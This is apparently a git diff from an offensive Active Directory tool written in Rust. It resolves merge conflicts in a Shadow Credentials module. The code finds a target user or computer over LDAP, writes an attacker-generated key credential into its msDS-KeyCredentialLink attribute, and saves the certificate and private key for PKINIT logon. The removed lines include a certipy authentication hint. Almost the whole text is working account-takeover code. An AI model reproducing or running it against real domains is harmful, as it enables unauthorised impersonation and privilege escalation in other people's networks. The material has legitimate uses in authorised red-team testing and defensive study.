@@ -188,6 +188,7 @@ pub fn build_key_credential(public_key_der: &[u8], device_id_bytes: &[u8; 16]) -
 }
 
 /// Parse a GUID string to bytes
+#[cfg_attr(not(test), allow(dead_code))]
 fn parse_guid(guid: &str) -> [u8; 16] {
     let clean = guid.replace('-', "");
     let mut bytes = [0u8; 16];
@@ -320,19 +321,6 @@ pub async fn execute(
         cred_blob.len()
     );
 
-<<<<<<< HEAD
-    // Step 3: Resolve target DN via LDAP
-    let target_filter = if config.target.contains(',') {
-        // Already a DN
-        format!("(distinguishedName={})", config.target)
-    } else if config.target.ends_with('$') {
-        format!(
-            "(&(objectClass=computer)(sAMAccountName={}))",
-            config.target
-        )
-    } else {
-        format!("(&(objectClass=user)(sAMAccountName={}))", config.target)
-=======
     // Resolve the actual DN of the target via LDAP search so the DN-with-Binary
     // value includes the correct distinguished name rather than an empty string.
     let target_dn = {
@@ -340,10 +328,7 @@ pub async fn execute(
             "(&(|(objectClass=user)(objectClass=computer))(sAMAccountName={}))",
             config.target
         );
-        match ldap
-            .custom_search(&filter, &["distinguishedName"])
-            .await
-        {
+        match ldap.custom_search(&filter, &["distinguishedName"]).await {
             Ok(entries) if !entries.is_empty() => entries[0]
                 .attrs
                 .get("distinguishedName")
@@ -351,59 +336,29 @@ pub async fn execute(
                 .cloned()
                 .unwrap_or_else(|| config.target.clone()),
             _ => {
-                info!("ShadowCredentials: Could not resolve DN for '{}'; using sAMAccountName as fallback", config.target);
+                info!(
+                    "ShadowCredentials: Could not resolve DN for '{}'; using sAMAccountName as fallback",
+                    config.target
+                );
                 config.target.clone()
             }
         }
     };
 
     let key_cred = KeyCredential {
-        dn: target_dn,
+        dn: target_dn.clone(),
         key_id: key_pair.key_id.clone(),
-        raw_value: cred_data.clone(),
+        raw_value: cred_blob.clone(),
         created: Utc::now(),
         is_ours: true,
->>>>>>> origin/main
     };
 
-    let entries = ldap
-        .custom_search(&target_filter, &["distinguishedName"])
-        .await
-        .map_err(|e| OverthroneError::TicketForge(format!("LDAP search for target failed: {e}")))?;
+    let ldap_mod_value = build_ldap_modification(&key_cred);
 
-    let target_dn = entries.first().map(|e| e.dn.clone()).ok_or_else(|| {
-        OverthroneError::TicketForge(format!("Target '{}' not found in AD", config.target))
-    })?;
-
-    info!("ShadowCredentials: Resolved target DN: {}", target_dn);
-
-    // Step 4: Write blob to msDS-KeyCredentialLink
-    if let Err(e) = ldap
-        .modify_add_binary(&target_dn, "msDS-KeyCredentialLink", cred_blob)
-        .await
-    {
-        return Ok(ShadowCredentialsResult {
-            target: config.target.clone(),
-            success: false,
-            key_id: key_pair.key_id,
-            cleaned_up: false,
-            tgt: None,
-            error: Some(format!("LDAP write failed: {e}")),
-        });
-    }
-
-    info!(
-        "ShadowCredentials: msDS-KeyCredentialLink written for {}",
-        target_dn
-    );
-
-<<<<<<< HEAD
-    // Step 5: Save key material to disk for PKINIT (e.g., via certipy or Rubeus)
-=======
     // Attempt the LDAP write to apply the msDS-KeyCredentialLink modification.
     // success is only set to true after the LDAP modify operation is confirmed.
     let ldap_write_ok = match ldap
-        .modify_add(&config.target, "msDS-KeyCredentialLink", &[ldap_mod_value])
+        .modify_add(&target_dn, "msDS-KeyCredentialLink", &[ldap_mod_value])
         .await
     {
         Ok(()) => {
@@ -417,7 +372,6 @@ pub async fn execute(
     };
 
     // Save key material to files for external PKINIT tools
->>>>>>> origin/main
     let output_prefix = format!("shadow_creds_{}", &key_pair.key_id[..8]);
     let cert_path = format!("{output_prefix}.pem");
     let key_path = format!("{output_prefix}.key");
@@ -433,16 +387,7 @@ pub async fn execute(
         info!("ShadowCredentials: Private key written to {key_path}");
     }
 
-<<<<<<< HEAD
-    info!(
-        "ShadowCredentials: Attack complete. Use the certificate and key for PKINIT:\n  \
-         certipy auth -pfx {}.pfx -dc-ip <DC>",
-        output_prefix
-    );
-
-=======
     // success is set only after LDAP write verification
->>>>>>> origin/main
     Ok(ShadowCredentialsResult {
         target: config.target.clone(),
         success: ldap_write_ok,
